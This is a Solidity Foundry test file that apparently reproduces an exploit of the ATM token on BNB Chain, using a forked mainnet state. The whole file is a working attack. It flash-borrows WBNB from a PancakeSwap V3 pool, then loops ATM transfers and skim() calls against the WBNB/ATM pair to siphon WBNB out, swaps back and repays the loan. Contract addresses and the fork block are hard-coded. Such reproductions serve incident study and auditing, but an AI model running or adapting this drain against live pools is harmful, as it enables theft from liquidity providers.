// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../../src/interface/interface.sol";

contract ContractTest is Test {
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 ATM = IERC20(0xa5957E0E2565dc93880da7be32AbCBdF55788888);
    Uni_Pair_V3 pool = Uni_Pair_V3(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
    Uni_Pair_V2 wbnb_atm =
        Uni_Pair_V2(0x1F5b26DCC6721c21b9c156Bf6eF68f51c0D075b7);
    Uni_Router_V2 router =
        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    uint256 constant PRECISION = 10 ** 18;
    address test_contract = address(this);
    address hack_contract;
    uint256 borrow_amount;

    function setUp() external {
        vm.createSelectFork("bsc", 37_483_300);
        deal(address(USDT), address(this), 0);
    }

    function testExploit() external {
        console2.log("before: ", WBNB.balanceOf(address(this)));
        borrow_amount = WBNB.balanceOf(address(pool)) - 1e18;
        pool.flash(address(this), 0, borrow_amount, "");
        console2.log("after: ", WBNB.balanceOf(address(this)));
    }

    function pancakeV3FlashCallback(
        uint256 fee0,
        uint256 /* fee1 */,
        bytes memory /*data*/
    ) public {
        console2.log("bnb: ", WBNB.balanceOf(address(this)));
        uint256 i = 0;
        uint256 j = 0;
        swap_token_to_token(
            address(WBNB),
            address(USDT),
            WBNB.balanceOf(address(this)) - 170 ether
        );
        console2.log(
            "bnb-usdt: ",
            WBNB.balanceOf(address(this)),
            USDT.balanceOf(address(this))
        );
        while (j < 2) {
            swap_token_to_token(address(WBNB), address(ATM), 70 ether);
            while (i < 100) {
                uint256 pair_wbnb = WBNB.balanceOf(address(wbnb_atm));
                console.log("--- ~ pair_wbnb:", pair_wbnb);
                ATM.transfer(address(wbnb_atm), ATM.balanceOf(address(this)));
                wbnb_atm.skim(address(this));
                (, uint wbnb_r, ) = wbnb_atm.getReserves();
                uint256 pair_lost = (pair_wbnb - wbnb_r) / 1e18;
                console.log("--- ~ pair_lost:", pair_lost);
                if (pair_lost == 7) {
                    break;
                }
                i++;
            }
            j++;
        }

        i = 0;
        while (i < 15) {
            uint256 pair_wbnb = WBNB.balanceOf(address(wbnb_atm));
            ATM.transfer(address(wbnb_atm), ATM.balanceOf(address(this)));
            wbnb_atm.skim(address(this));
            (, uint wbnb_r, ) = wbnb_atm.getReserves();
            uint256 pair_lost = (pair_wbnb - wbnb_r) / 1e18;
            console.log("--- ~ pair_lost:", pair_lost);
            if (pair_lost == 0) {
                break;
            }
            i++;
        }
        swap_token_to_token(
            address(ATM),
            address(WBNB),
            ATM.balanceOf(address(this))
        );
        swap_token_to_token(
            address(USDT),
            address(WBNB),
            USDT.balanceOf(address(this))
        );
        console.log("--- ~ WBNB:", WBNB.balanceOf(address(this)));
        WBNB.transfer(address(pool), (borrow_amount * 10_000) / 9975 + 1000);
    }

    function swap_token_to_token(
        address a,
        address b,
        uint256 amount
    ) internal {
        IERC20(a).approve(address(router), amount);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}
